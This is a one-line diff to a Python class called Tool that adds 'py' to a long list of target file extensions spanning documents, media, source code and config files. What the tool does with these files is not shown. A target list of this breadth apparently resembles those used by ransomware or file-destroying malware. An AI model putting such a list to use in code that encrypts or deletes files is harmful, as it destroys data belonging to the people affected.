@@ -63,7 +63,7 @@ class Tool:
         self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
                         "epub", "mp3", "gif", "doc", "odp", "ods", "json",
                         "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp",
-                       "rb", "java", "pl", "apk", "raw", "eml", "msg", "tmp",
+                       "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
